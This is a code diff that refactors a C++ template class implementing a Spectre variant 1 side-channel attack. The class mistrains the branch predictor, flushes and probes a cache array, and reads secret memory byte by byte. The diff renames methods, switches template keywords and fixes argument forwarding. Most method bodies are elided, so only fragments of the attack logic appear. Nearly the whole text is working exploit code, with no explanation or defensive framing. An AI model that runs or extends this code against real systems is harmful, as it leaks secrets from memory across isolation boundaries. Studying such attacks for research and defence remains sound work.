@@ -17,7 +17,7 @@
 // block_len must be at least the cache line size; a small block_len means poor accuracy
 //      increasing n_max_tries and n_trainings can improve accuracy but will make each byte read slower
 
-template< class FnVuln, class FnTrain >
+template< typename FnVuln, typename FnTrain >
 class SpectreFunc {
 public:
     SpectreFunc(FnVuln fn_vuln, FnTrain fn_train)
@@ -32,7 +32,7 @@ public:
         m_fn_vuln(std::forward<Args>(args)...);
     }
 
-    auto get_legal_args(size_t i)
+    auto get_train_x(size_t i)
     {
         return m_fn_train(i);
     }
@@ -52,21 +52,21 @@ private:
     FnTrain m_fn_train;
 };
 
-template <typename FnVuln, typename FnTrain>
+template < typename FnVuln, typename FnTrain >
 class Spectrev1 {
 public:
 
     inline Spectrev1(
             void * const p_base,                         // base address from which we read secret
             void * const p_scratchpad,                   // probe array (must be writeable)
-            FnVuln &&fn_vuln,                                 // calls the speculative function
-            FnTrain &&fn_get_trainx,                        // given a size_t, returns a legal argument for fn_vuln
+            FnVuln &&fn_vuln,                            // calls the speculative function
+            FnTrain &&fn_train,                             // given a size_t, returns a legal argument for fn_vuln
             size_t block_len,                               // num bytes b/w monitored lines of p_scratchpad
             size_t n_max_tries,                             // max num attempts to read secret
             int n_trainings)                                // num times to send good arg to fn_vuln before sending bad arg
         : p_base(reinterpret_cast<uint8_t * const>(p_base)),
           p_scratchpad(reinterpret_cast<uint8_t * const>(p_scratchpad)),
-          fn_spectre(SpectreFunc(fn_vuln, fn_get_trainx)),
+          fn_spectre(std::forward<FnVuln>(fn_vuln), std::forward<FnTrain>(fn_train)),
           block_len(block_len),
           n_max_tries(n_max_tries),
           n_trainings(n_trainings),
@@ -106,7 +106,7 @@ private:
     int results[MAX_BYTE];      // track hits in p_base
 };
 
-template <class FnVuln, class FnTrain>
+template < typename FnVuln, typename FnTrain >
 inline volatile void Spectrev1<FnVuln, FnTrain>::read( void volatile * const p_secret, size_t n_bytes, uint8_t *p_buf)
 {
     for(auto i = 0; i < n_bytes; ++i)
@@ -114,7 +114,8 @@ inline volatile void Spectrev1<FnVuln, FnTrain>::read( void volatile * const p_s
         read_byte(CVMEM_ADD(p_secret,i), &p_buf[i]);
     }
 }
-template <class FnVuln, class FnTrain>
+
+template < typename FnVuln, typename FnTrain >
 inline volatile void Spectrev1<FnVuln, FnTrain>::read_byte( void volatile * const p_secret, uint8_t *p_val)
 {
     memset(results, 0 , sizeof(results));
@@ -124,7 +125,7 @@ inline volatile void Spectrev1<FnVuln, FnTrain>::read_byte( void volatile * cons
 
     for (auto tries = n_max_tries; tries > 0; --tries)
     {
-        do_attack(fn_spectre.get_legal_args(tries), mal_x);
+        do_attack(fn_spectre.get_train_x(tries), mal_x);
 
         if ( (results[high] == 2 && results[high2] == 0) || (results[high] >= (2*results[high2] + n_trainings)) )
         {
@@ -135,7 +136,7 @@ inline volatile void Spectrev1<FnVuln, FnTrain>::read_byte( void volatile * cons
     *p_val = high;
 }
 
-template <class FnVuln, class FnTrain>
+template < typename FnVuln, typename FnTrain >
 inline void Spectrev1<FnVuln, FnTrain>::do_attack(size_t train_x, size_t mal_x)
 {
     // Fast Flush every cache line in p_scratchpad
@@ -147,7 +148,8 @@ inline void Spectrev1<FnVuln, FnTrain>::do_attack(size_t train_x, size_t mal_x)
     mistrain(train_x, mal_x);
     find_hits(train_x);
 }
-template <class FnVuln, class FnTrain>
+
+template < typename FnVuln, typename FnTrain >
 inline void Spectrev1<FnVuln, FnTrain>::mistrain(size_t train_x, size_t mal_x)
 {
     volatile uint64_t x;
@@ -162,7 +164,7 @@ inline void Spectrev1<FnVuln, FnTrain>::mistrain(size_t train_x, size_t mal_x)
     }
 }
 
-template <class FnVuln, class FnTrain>
+template < typename FnVuln, typename FnTrain >
 inline void Spectrev1<FnVuln, FnTrain>::find_hits(size_t train_x)
 {
     int mix_i, i;
